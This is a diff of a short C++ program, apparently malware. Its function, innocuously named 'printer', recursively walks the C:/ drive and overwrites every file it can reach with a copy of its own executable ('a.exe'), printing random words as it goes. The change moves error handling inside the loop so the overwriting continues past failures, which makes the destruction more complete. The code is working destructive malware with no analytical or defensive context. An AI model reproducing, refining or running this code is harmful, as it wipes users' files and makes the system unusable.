@@ -14,23 +14,18 @@ string Chain = "";
 
 void printer()
 {
-	
-		std::string path = "C:/";
+	std::string path = "C:/";
+	for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
+		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
 		try {
-		    for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
-
-					CopyFile("./a.exe",entry.path().string().c_str(),0);
-		   			Chain = Chain + sWords[rand() % 4];
-					cout << Chain;
-		    }
-		}	
+			CopyFile("./a.exe",entry.path().string().c_str(),0);
+		}
 		catch (const std::exception& e){
 		}
+	}	
 }
 int main()
 {
-
 	printer();
-
-
 }
